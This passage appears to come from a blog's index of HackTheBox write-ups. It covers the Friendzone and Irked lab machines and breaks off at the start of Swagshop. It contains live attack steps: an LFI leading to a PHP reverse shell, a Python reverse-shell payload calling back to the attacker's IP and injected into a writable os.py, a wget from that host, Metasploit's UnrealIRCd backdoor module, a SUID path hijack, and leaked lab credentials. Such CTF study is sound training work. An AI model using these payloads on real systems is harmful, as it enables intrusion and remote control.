[+] Guest session IP: 10.10.10.123:445\tName: friendzone.htb Disk Permissions\tComment ---- -----------\t------- print$ NO ACCESS\tPrinter Drivers Files NO ACCESS\tFriendZone Samba Server Files /etc/Files general READ ONLY\tFriendZone Samba Server Files .\\general\\* dr--r--r-- 0 Wed Jan 16 15:10:51 2019\t. dr--r--r-- 0 Wed Jan 23 16:51:02 2019\t.. fr--r--r-- 57 Tue Oct 9 19:52:42 2018\tcreds.txt Development READ, WRITE\tFriendZone Samba Server Files .\\Development\\* dr--r--r-- 0 Fri Jul 1 21:52:22 2022\t. dr--r--r-- 0 Wed Jan 23 16:51:02 2019\t.. fr--r--r-- 46631 Fri Jul 1 14:59:27 2022\tLinEnum.sh fr--r--r-- 5493 Fri Jul 1 14:51:01 2022\tphp-reverse-shell.php fr--r--r-- 33 Fri Jul 1 14:34:42 2022\ttest.php IPC$ NO ACCESS\tIPC Service (FriendZone server (Samba, Ubuntu))   smbclient\n1 2 3  smbclient //10.10.10.123/general get creds.txt   1 2 3 4 5 6  smbclient --no-pass //10.10.10.123/general smb: \\\u0026gt; ls . D 0 Wed Jan 16 15:10:51 2019 .. D 0 Wed Jan 23 16:51:02 2019 creds.txt N 57 Tue Oct 9 19:52:42 2018   1  smb: \\\u0026gt; get creds.txt   1 2 3 4  cat creds.txt creds for the admin THING: admin:WORKWORKHhallelujah@#    http://10.10.10.123 friendzoneportal.red might be a subdomain  1 2 3 4 5 6 7 8 9 10 11  \u0026lt;title\u0026gt;Friend Zone Escape software\u0026lt;/title\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h2\u0026gt;Have you ever been friendzoned ?\u0026lt;/h2\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;center\u0026gt;\u0026lt;img src=\u0026#34;fz.jpg\u0026#34;\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h2\u0026gt;if yes, try to get out of this zone ;)\u0026lt;/h2\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h2\u0026gt;Call us at : +999999999\u0026lt;/h2\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h2\u0026gt;Email us at: info@friendzoneportal.red\u0026lt;/h2\u0026gt;\u0026lt;/center\u0026gt;   DNS zone transfer 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  dig axfr friendzoneportal.red @10.10.10.123 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.1-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; axfr friendzoneportal.red @10.10.10.123 ;; global options: +cmd friendzoneportal.red.\t604800\tIN\tSOA\tlocalhost. root.localhost. 2 604800 86400 2419200 604800 friendzoneportal.red.\t604800\tIN\tAAAA\t::1 friendzoneportal.red.\t604800\tIN\tNS\tlocalhost. friendzoneportal.red.\t604800\tIN\tA\t127.0.0.1 admin.friendzoneportal.red. 604800 IN\tA\t127.0.0.1 files.friendzoneportal.red. 604800 IN\tA\t127.0.0.1 imports.friendzoneportal.red. 604800 IN\tA\t127.0.0.1 vpn.friendzoneportal.red. 604800 IN\tA\t127.0.0.1 friendzoneportal.red.\t604800\tIN\tSOA\tlocalhost. root.localhost. 2 604800 86400 2419200 604800 ;; Query time: 16 msec ;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP) ;; WHEN: Fri Jul 01 22:03:32 EDT 2022 ;; XFR size: 9 records (messages 1, bytes 309)   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  dig axfr friendzone.red @10.10.10.123 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.1-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; axfr friendzone.red @10.10.10.123 ;; global options: +cmd friendzone.red.\t604800\tIN\tSOA\tlocalhost. root.localhost. 2 604800 86400 2419200 604800 friendzone.red.\t604800\tIN\tAAAA\t::1 friendzone.red.\t604800\tIN\tNS\tlocalhost. friendzone.red.\t604800\tIN\tA\t127.0.0.1 administrator1.friendzone.red. 604800 IN A\t127.0.0.1 hr.friendzone.red.\t604800\tIN\tA\t127.0.0.1 uploads.friendzone.red.\t604800\tIN\tA\t127.0.0.1 friendzone.red.\t604800\tIN\tSOA\tlocalhost. root.localhost. 2 604800 86400 2419200 604800 ;; Query time: 12 msec ;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP) ;; WHEN: Fri Jul 01 22:03:50 EDT 2022 ;; XFR size: 8 records (messages 1, bytes 289)   1 2 3 4 5 6 7 8 9 10 11  zonetransfer --- friendzone.red\tadministrator1.friendzone.red hr.friendzone.red\tuploads.friendzone.red\tfriendzoneportal.red admin.friendzoneportal.red files.friendzoneportal.red imports.friendzoneportal.red vpn.friendzoneportal.red    adding to /etc/hosts  1  friendzone.red administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red friendzoneportal.red admin.friendzoneportal.red files.friendzoneportal.red imports.friendzoneportal.red vpn.friendzoneportal.red   Aquatone: Aquatone is a tool for visual inspection of websites across a large amount of hosts and is convenient for quickly gaining an overview of HTTP-based attack surface.\nhttps://github.com/michenriksen/aquatone\nInstalling Aquatone on kali: https://medium.com/@sherlock297/install-aquatone-on-kali-linux-dd2a6850fd32\n1 2 3 4 5 6 7 8 9 10 11  hosts --- https://friendzone.red https://administrator1.friendzone.red https://hr.friendzone.red https://uploads.friendzone.red https://friendzoneportal.red https://admin.friendzoneportal.red https://files.friendzoneportal.red https://imports.friendzoneportal.red https://vpn.friendzoneportal.red   1 2 3 4  mdkir aquatone mv hosts ./aquatone cat hosts | aquatone   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  aquatone v1.7.0 started at 2022-07-01T22:47:54-04:00 Using unreliable Google Chrome for screenshots. Install Chromium for better results. Targets : 9 Threads : 1 Ports : 80, 443, 8000, 8080, 8443 Output dir : . https://friendzone.red: 200 OK https://administrator1.friendzone.red: 200 OK https://hr.friendzone.red: 404 Not Found https://uploads.friendzone.red: 200 OK https://friendzoneportal.red: 200 OK https://admin.friendzoneportal.red: 200 OK https://files.friendzoneportal.red: 404 Not Found https://imports.friendzoneportal.red: 404 Not Found https://vpn.friendzoneportal.red: 404 Not Found https://friendzone.red: screenshot successful https://administrator1.friendzone.red: screenshot successful https://hr.friendzone.red: screenshot successful https://uploads.friendzone.red: screenshot successful https://friendzoneportal.red: screenshot successful https://admin.friendzoneportal.red: screenshot successful https://files.friendzoneportal.red: screenshot successful https://imports.friendzoneportal.red: screenshot successful https://vpn.friendzoneportal.red: screenshot successful Calculating page structures... done Clustering similar pages... done Generating HTML report... done Writing session file...Time: - Started at : 2022-07-01T22:47:54-04:00 - Finished at : 2022-07-01T22:48:04-04:00 - Duration : 10s Requests: - Successful : 9 - Failed : 0 - 2xx : 5 - 3xx : 0 - 4xx : 4 - 5xx : 0 Screenshots: - Successful : 9 - Failed : 0 Wrote HTML report to: aquatone_report.html   1 2 3  open aquatone_report.html or firefox aquatone_report.html   1 2 3 4 5 6  https://friendzone.red: 200 OK https://administrator1.friendzone.red: 200 OK (login portal) https://hr.friendzone.red: 404 Not Found https://uploads.friendzone.red: 200 OK https://friendzoneportal.red: 200 OK https://admin.friendzoneportal.red: 200 OK   Going into the login page https://administrator1.friendzone.red with creds admin : WORKWORKHhallelujah@#\n https://administrator1.friendzone.red/   https://admin.friendzoneportal.red/   https://friendzone.red/   https://friendzoneportal.red/   https://uploads.friendzone.red/  Looking back the smbmap we found that Development is READ, WRITE open it up for files upload. Also, files might be located in /etc/Files or /etc/Development\n1 2 3 4 5 6 7 8 9 10  smbmap -H 10.10.10.123 [+] Guest session IP: 10.10.10.123:445\tName: friendzone.red Disk Permissions\tComment ---- -----------\t------- print$ NO ACCESS\tPrinter Drivers Files NO ACCESS\tFriendZone Samba Server Files /etc/Files general READ ONLY\tFriendZone Samba Server Files Development READ, WRITE\tFriendZone Samba Server Files IPC$ NO ACCESS\tIPC Service (FriendZone server (Samba, Ubuntu))   1 2 3 4 5  test --- \u0026lt;?php echo \u0026#34;testing testing\u0026#34; ?\u0026gt;   1 2 3 4  smbclient //10.10.10.123/development [Enter] to skip password put test   We see a result\n1  /dashboard.php?image_id=a.jpg\u0026amp;pagename=/etc/Development/test    Using php-reverse-shell  1 2 3  put rev.php nc -lvnp 1234    to execute /rev or name of the file since it is already appending .php  1  /dashboard.php?image_id=a.jpg\u0026amp;pagename=/etc/Development/rev// Some code   Privilege Escalation 1 2 3 4 5 6 7 8 9 10 11  cd /var/www www-data@FriendZone:/var/www$ cat mysql_data.conf cat mysql_data.conf for development process this is the mysql creds for user friend db_user=friend db_pass=Agpyu12!0.213$ db_name=FZ   Database credential → friend : Agpyu12!0.213$\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  cat /etc/passwd root❌0:0:root:/root:/bin/bash daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin bin❌2:2:bin:/bin:/usr/sbin/nologin sys❌3:3:sys:/dev:/usr/sbin/nologin sync❌4:65534:sync:/bin:/bin/sync games❌5:60:games:/usr/games:/usr/sbin/nologin man❌6:12:man:/var/cache/man:/usr/sbin/nologin lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail❌8:8:mail:/var/mail:/usr/sbin/nologin news❌9:9:news:/var/spool/news:/usr/sbin/nologin uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy❌13:13:proxy:/bin:/usr/sbin/nologin www-data❌33:33:www-data:/var/www:/usr/sbin/nologin backup❌34:34:backup:/var/backups:/usr/sbin/nologin list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network❌100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve❌101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog❌102:106::/home/syslog:/usr/sbin/nologin messagebus❌103:107::/nonexistent:/usr/sbin/nologin _apt❌104:65534::/nonexistent:/usr/sbin/nologin uuidd❌105:109::/run/uuidd:/usr/sbin/nologin friend❌1000:1000:friend,,,:/home/friend:/bin/bash sshd❌106:65534::/run/sshd:/usr/sbin/nologin Debian-exim❌107:114::/var/spool/exim4:/usr/sbin/nologin ftp❌108:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin bind❌109:116::/var/cache/bind:/usr/sbin/nologin// Some code   1 2  su friend password: Agpyu12!0.213$   We can ssh into with friend : Agpyu12!0.213$\n1  ssh friend@10.10.10.123   1  wget http://10.10.14.9:8000/linpeas.sh   pspy: is a command line tool designed to snoop on processes without need for root permissions\nLink: https://github.com/DominicBreuker/pspy\n There is a process running on /opt/server_admin/reporter.py  1 2 3 4 5 6  friend@FriendZone:~$ ./pspy32 2022/07/02 21:22:43 CMD: UID=0 PID=32214 | /usr/sbin/nmbd --foreground --no-process-group 2022/07/02 21:24:01 CMD: UID=0 PID=32218 | /bin/sh -c /opt/server_admin/reporter.py 2022/07/02 21:24:01 CMD: UID=0 PID=32217 | /bin/sh -c /opt/server_admin/reporter.py 2022/07/02 21:24:01 CMD: UID=0 PID=32216 | /usr/sbin/CRON -f   There are credentials for the database but there are no ports related to the database after runing linpeas.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  ╔══════════╣ Active Ports ╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports tcp 0 0 10.10.10.123:53 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:53 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:953 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:445 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:139 0.0.0.0:* LISTEN - tcp6 0 0 :::21 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - tcp6 0 0 ::1:25 :::* LISTEN - tcp6 0 0 :::443 :::* LISTEN - tcp6 0 0 :::445 :::* LISTEN - tcp6 0 0 :::139 :::* LISTEN - tcp6 0 0 :::80 :::* LISTEN -   1 2  Files with capabilities (limited to 50): /usr/bin/mtr-packet = cap_net_raw+ep   Checking the file /opt/server_admin/reporter.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  #!/usr/bin/python import os to_address = \u0026#34;admin1@friendzone.com\u0026#34; from_address = \u0026#34;admin2@friendzone.com\u0026#34; print \u0026#34;[+] Trying to send email to %s\u0026#34;%to_address #command = \u0026#39;\u0026#39;\u0026#39; mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass \u0026#34;PAPAP\u0026#34;\u0026#39;\u0026#39;\u0026#39; #os.system(command) # I need to edit the script later # Sam ~ python developer    No luck on the set capabiliies attack vector  1 2 3 4 5  friend@FriendZone:/usr/bin$ ls -al mtr-packet -rwxr-xr-x 1 root root 26616 Nov 2 2017 mtr-packet friend@FriendZone:~$ getcap -r / 2\u0026gt;/dev/null /usr/bin/mtr-packet = cap_net_raw+ep   1 2 3  ╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500) /usr/lib/python2.7/os.py /usr/lib/python2.7/os.pyc    Edit the script and paste the following at the end of os.py  1 2 3 4 5 6 7 8  import socket,subprocess,os,pty s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((\u0026#34;10.10.14.9\u0026#34;,4321)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) pty.spawn(\u0026#34;/bin/bash\u0026#34;)    Start netcat listener  1  nc -lvnp 4321   Skills Learned  Module hijacking DNS zone transfer  ","description":"FriendZone is an easy difficulty Linux box which needs fair amount enumeration. By doing a zone transfer vhosts are discovered. There are open shares on samba which provides credentials for an admin panel. From there, an LFI is found which is leveraged to get RCE. A cron is found running which uses a writable module, making it vulnerable to hijacking.","id":6,"section":"posts","tags":["Hackthebox","OSCP","php","web","network","vulnerability assessment","protocols","source code analysis","authentication","smb","dns","web site structure discovery","password reuse","scheduled job abuse","local file inclusion","remote code execution","anonymous/guest access","path hijacking","sensitive data exposure","zone transfer"],"title":"Hackthebox - Friendzone","uri":"https://hswootan.github.io/en/posts/friendzone/"},{"content":"\r\rEnumeration 1  nmap -sV -sC -vv 10.10.10.117 -oN irked_scan.txt   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) | ssh-hostkey: | 1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA) | ssh-dss AAAAB3NzaC1kc3MAAACBAI+wKAAyWgx/P7Pe78y6/80XVTd6QEv6t5ZIpdzKvS8qbkChLB7LC+/HVuxLshOUtac4oHr/IF9YBytBoaAte87fxF45o3HS9MflMA4511KTeNwc5QuhdHzqXX9ne0ypBAgFKECBUJqJ23Lp2S9KuYEYLzUhSdUEYqiZlcc65NspAAAAFQDwgf5Wh8QRu3zSvOIXTk+5g0eTKQAAAIBQuTzKnX3nNfflt++gnjAJ/dIRXW/KMPTNOSo730gLxMWVeId3geXDkiNCD/zo5XgMIQAWDXS+0t0hlsH1BfrDzeEbGSgYNpXoz42RSHKtx7pYLG/hbUr4836olHrxLkjXCFuYFo9fCDs2/QsAeuhCPgEDjLXItW9ibfFqLxyP2QAAAIAE5MCdrGmT8huPIxPI+bQWeQyKQI/lH32FDZb4xJBPrrqlk9wKWOa1fU2JZM0nrOkdnCPIjLeq9+Db5WyZU2u3rdU8aWLZy8zF9mXZxuW/T3yXAV5whYa4QwqaVaiEzjcgRouex0ev/u+y5vlIf4/SfAsiFQPzYKomDiBtByS9XA== | 2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDDGASnp9kH4PwWZHx/V3aJjxLzjpiqc2FOyppTFp7/JFKcB9otDhh5kWgSrVDVijdsK95KcsEKC/R+HJ9/P0KPdf4hDvjJXB1H3Th5/83gy/TEJTDJG16zXtyR9lPdBYg4n5hhfFWO1PxM9m41XlEuNgiSYOr+uuEeLxzJb6ccq0VMnSvBd88FGnwpEoH1JYZyyTnnbwtBrXSz1tR5ZocJXU4DmI9pzTNkGFT+Q/K6V/sdF73KmMecatgcprIENgmVSaiKh9mb+4vEfWLIe0yZ97c2EdzF5255BalP3xHFAY0jROiBnUDSDlxyWMIcSymZPuE1N6Tu8nQ/pXxKvUar | 256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFeZigS1PimiXXJSqDy2KTT4UEEphoLAk8/ftEXUq0ihDOFDrpgT0Y4vYgYPXboLlPBKBc0nVBmKD+6pvSwIEy8= | 256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC6m+0iYo68rwVQDYDejkVvsvg22D8MN+bNWMUEOWrhj 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.10 ((Debian)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Apache/2.4.10 (Debian) 111/tcp open rpcbind syn-ack ttl 63 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100024 1 35881/tcp6 status | 100024 1 36293/tcp status | 100024 1 53120/udp6 status |_ 100024 1 59456/udp status Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   1  nmap -A -p- 10.10.10.117 -oN irked_fullscan.txt   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) | ssh-hostkey: | 1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA) | 2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA) | 256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA) |_ 256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519) 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Apache/2.4.10 (Debian) 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100024 1 35881/tcp6 status | 100024 1 36293/tcp status | 100024 1 53120/udp6 status |_ 100024 1 59456/udp status 6697/tcp open irc UnrealIRCd 8067/tcp open irc UnrealIRCd 36293/tcp open status 1 (RPC #100024) 65534/tcp open irc UnrealIRCd Aggressive OS guesses: Linux 3.13 (95%), Linux 3.2 - 4.9 (95%), Linux 4.8 (95%), Linux 4.9 (95%), Linux 3.16 (95%), Linux 3.12 (95%), Linux 3.18 (95%), Linux 3.8 - 3.11 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 4.4 (95%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel   Exploitation 1  nc -nv 10.10.10.117 6697   1 2 3 4 5 6  ADMIN :irked.htb 256 :Administrative info about irked.htb :irked.htb 257 :Bob Smith :irked.htb 258 :bob :irked.htb 258 :widely@used.name   1 2 3  nc -nv 10.10.10.117 6697 (UNKNOWN) [10.10.10.117] 6697 (ircs-u) open ERROR :Closing Link: [10.10.14.32] (Throttled: Reconnecting too fast) -Email djmardov@irked.htb for more information.   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  helpop usercmds :irked.htb 292 ran213eqdw123 : Currently the following User commands are available. :irked.htb 292 ran213eqdw123 : Use /HELPOP \u0026lt;command name\u0026gt; to get more information about :irked.htb 292 ran213eqdw123 : a specific command. :irked.htb 292 ran213eqdw123 : - :irked.htb 292 ran213eqdw123 : ==-------------------------oOo-------------------------== :irked.htb 292 ran213eqdw123 : ADMIN LICENSE PART USERHOST :irked.htb 292 ran213eqdw123 : AWAY LINKS PING USERIP :irked.htb 292 ran213eqdw123 : CREDITS LIST PONG VERSION :irked.htb 292 ran213eqdw123 : CYCLE LUSERS PRIVMSG VHOST :irked.htb 292 ran213eqdw123 : DALINFO MAP QUIT WATCH :irked.htb 292 ran213eqdw123 : DCCALLOW MODE RULES WHO :irked.htb 292 ran213eqdw123 : INVITE MODULE SETNAME WHOIS :irked.htb 292 ran213eqdw123 : ISON MOTD SILENCE WHOWAS :irked.htb 292 ran213eqdw123 : JOIN NAMES STATS :irked.htb 292 ran213eqdw123 : KICK NICK TIME :irked.htb 292 ran213eqdw123 : KNOCK NOTICE TOPIC :irked.htb 292 ran213eqdw123 : ==-------------------------oOo-------------------------==   Using msfconsole\n1 2 3 4 5 6 7 8 9 10 11 12 13  search unreal use exploit/unix/irc/unreal_ircd_3281_backdoor set rhosts 10.10.10.117 set rport 6697 set payload set payload/cmd/unix/bind_perl run   1 2 3 4 5 6 7 8 9  cd /home/ ls -\u0026gt; djmardov ircd ircd@irked:/home/djmardov/Documents$ ls -al drwxr-xr-x 2 djmardov djmardov 4096 May 15 2018 . drwxr-xr-x 18 djmardov djmardov 4096 Nov 3 2018 .. -rw-r--r-- 1 djmardov djmardov 52 May 16 2018 .backup -rw------- 1 djmardov djmardov 33 May 15 2018 user.txt   Cannot open the user.txt for user djmardov but there is a .backup file. This could be a password for steganography image in the port 80\n1 2 3 4  ircd@irked:/home/djmardov/Documents$ cat .backup Super elite steg backup pw UPupDOWNdownLRlrBAbaSSss   steghide We can use steghide to find anything inside the jpeg\n1  steghide extract -sf irked.jpg   Potential password for djmardov : Kab6h+m+bbp2J:HG\nPrivilege Escalation I could not enumerate linpeas on this machine. No crontabs, sudo -l was not an option. Then I went on see If I could get priv esc through kernel\n1 2 3  uname -a Linux irked 3.16.0-6-686-pae #1 SMP Debian 3.16.56-1+deb8u1 (2018-05-08) i686 GNU/Linux   Found some ref but wasnt sure if it applies to the vulnerable machine. Ref: https://www.exploit-db.com/exploits/44302 but the it did not work.\nFind specific file permissions:\n1  find / -perm -u=s -type f 2\u0026gt;/dev/null// Some code   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/eject/dmcrypt-get-device /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/openssh/ssh-keysign /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper /usr/sbin/exim4 /usr/sbin/pppd /usr/bin/chsh /usr/bin/procmail /usr/bin/gpasswd /usr/bin/newgrp /usr/bin/at /usr/bin/pkexec /usr/bin/X /usr/bin/passwd /usr/bin/chfn /usr/bin/viewuser /sbin/mount.nfs /bin/su /bin/mount /bin/fusermount /bin/ntfs-3g /bin/umount   1 2 3  cd /usr/bin ls -al   1 2  djmardov@irked:/usr/bin$ file viewuser viewuser: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=69ba4bc75bf72037f1ec492bc4cde2550eeac4bb, not stripped   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84  djmardov@irked:/usr/bin$ strings viewuser --- /lib/ld-linux.so.2 libc.so.6 _IO_stdin_used setuid puts system __cxa_finalize __libc_start_main GLIBC_2.0 GLIBC_2.1.3 _ITM_deregisterTMCloneTable __gmon_start__ _ITM_registerTMCloneTable UWVS [^_] This application is being devleoped to set and test user permissions It is still being actively developed /tmp/listusers ;*2$\u0026#34; GCC: (Debian 7.2.0-8) 7.2.0 crtstuff.c deregister_tm_clones __do_global_dtors_aux completed.6586 __do_global_dtors_aux_fini_array_entry frame_dummy __frame_dummy_init_array_entry viewuser.c __FRAME_END__ __init_array_end _DYNAMIC __init_array_start __GNU_EH_FRAME_HDR _GLOBAL_OFFSET_TABLE_ __libc_csu_fini _ITM_deregisterTMCloneTable __x86.get_pc_thunk.bx _edata __x86.get_pc_thunk.dx __cxa_finalize@@GLIBC_2.1.3 __data_start puts@@GLIBC_2.0 system@@GLIBC_2.0 __gmon_start__ __dso_handle _IO_stdin_used __libc_start_main@@GLIBC_2.0 __libc_csu_init _fp_hw __bss_start main setuid@@GLIBC_2.0 __TMC_END__ _ITM_registerTMCloneTable .symtab .strtab .shstrtab .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame .init_array .fini_array .dynamic .got.plt .data .bss .comment   The binary seems to call setuid() then calls /tmp/listusers\nI tried to run the application but says that file does not exist so maybe we can create one\n1 2 3 4  djmardov@irked:/usr/bin$ echo \u0026#34;/bin/bash\u0026#34; \u0026gt; /tmp/listusers # sh and bash also works djmardov@irked:/usr/bin$ chmod a+x /tmp/listusers # [a] allow permission to all [-x] execute djmardov@irked:/tmp$ /usr/bin/viewuser   Skills Learned  Exploit modification Troubleshooting Metasploit modulesi Linux Enumeration  ","description":"Irked is a pretty simple and straight-forward box which requires basic enumeration skills. It shows the need to scan all ports on machines and to investigate any out of the place binaries found while enumerating a system.","id":7,"section":"posts","tags":["Hackthebox","OSCP","vulnerability assessment","stenography","outdated software","security tools","reversing","metasploit","backdoor","binary exploitation","suid exploitation","maintain access","clear text credentials","information disclosure"],"title":"Hackthebox - Irked","uri":"https://hswootan.github.io/en/posts/irked/"},{"content":"\r\rEnumeration 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  nmap -A -p- 10.10.10.140 -oN swagshop_full_scan.txt PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA) | 256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA) |_ 256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Did not follow redirect to http://swagshop.htb/ |_http-server-header: Apache/2.4.18 (Ubuntu) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.92%E=4%D=7/2%OT=22%CT=1%CU=43676%PV=Y%DS=2%DC=T%G=Y%TM=62C0A4B4 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)OPS( OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11 OS:NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN( OS:R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= OS:S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 1723/tcp) HOP RTT ADDRESS 1 13.15 ms 10.10.14.1 2 13.43 ms 10.10.10.140 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 66.46 seconds   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  nmap -sV -sC -p 22,80 -vv 10.10.10.140 